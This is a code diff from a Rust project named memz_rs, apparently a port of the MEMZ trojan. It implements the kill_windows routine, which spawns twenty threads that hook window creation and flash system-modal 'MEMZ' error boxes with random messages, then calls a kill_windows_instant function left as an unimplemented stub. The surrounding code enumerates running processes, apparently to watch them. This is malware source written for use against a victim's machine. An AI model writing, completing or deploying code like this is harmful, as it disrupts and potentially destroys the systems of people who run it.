@@ -1,25 +1,32 @@
 #![allow(unused_imports)]
 #![allow(dead_code)]
 use memz_rs::{
+    convert_str::ToPCSTRWrapper,
+    data::data::msgs,
+    payloads::payloads::msg_box_hook,
     wrap_windows_api::{
-        lstrcmp_w, wrap_close_handle, wrap_create_toolhelp32_snapshot,
-        wrap_get_process_image_filename_a, wrap_process32_next, Commandline, Resolution,
+        lstrcmp_w, wrap_close_handle, wrap_create_toolhelp32_snapshot, wrap_get_current_thread_id,
+        wrap_get_process_image_filename_a, wrap_messagebox_a, wrap_process32_next,
+        wrap_set_windows_hook_ex_a, Commandline, Resolution, wrap_unhook_windows_hook_ex,
     },
     LMEM_ZEROINIT,
 };
+use rand::Rng;
 use std::{
     mem::size_of,
     thread::{self, sleep},
     time::Duration,
 };
 use windows::{
+    core::PCSTR,
     Win32::{
-        Foundation::{BOOL, HANDLE, HWND, INVALID_HANDLE_VALUE},
+        Foundation::{BOOL, HANDLE, HMODULE, HWND, INVALID_HANDLE_VALUE},
         Graphics::Gdi::HFONT,
         System::{
             Diagnostics::ToolHelp::{Process32First, PROCESSENTRY32},
             Threading::{OpenProcess, PROCESS_QUERY_INFORMATION},
         },
+        UI::WindowsAndMessaging::{HOOKPROC, MB_ICONHAND, MB_OK, MB_SYSTEMMODAL, WH_CBT},
     },
 };
 
@@ -30,7 +37,36 @@ struct Clean {
     dialog: HWND,
 }
 
-fn kill_windows() {}
+fn kill_windows() {
+    for _ in 0..20 {
+        let rip_message_thread = thread::spawn(move || -> Result<(), ()> {
+            let hook = wrap_set_windows_hook_ex_a(
+                WH_CBT,
+                Some(msg_box_hook),
+                HMODULE(0 as isize),
+                wrap_get_current_thread_id(),
+            )?;
+            let mut rng = rand::thread_rng();
+            let random = rng.gen_range(0..=25);
+            wrap_messagebox_a(
+                HWND(Default::default()),
+                *msgs[random as usize].to_pcstr(),
+                "MEMZ",
+                MB_OK | MB_SYSTEMMODAL | MB_ICONHAND,
+            )?;
+            wrap_unhook_windows_hook_ex(hook)?;
+            Ok(())
+        });
+        rip_message_thread.join().unwrap().unwrap();
+        sleep(Duration::from_millis(100));
+    }
+
+    kill_windows_instant()
+}
+
+fn kill_windows_instant() {
+    todo!()
+}
 
 fn main() -> windows::core::Result<()> {
     let res = Resolution::new();
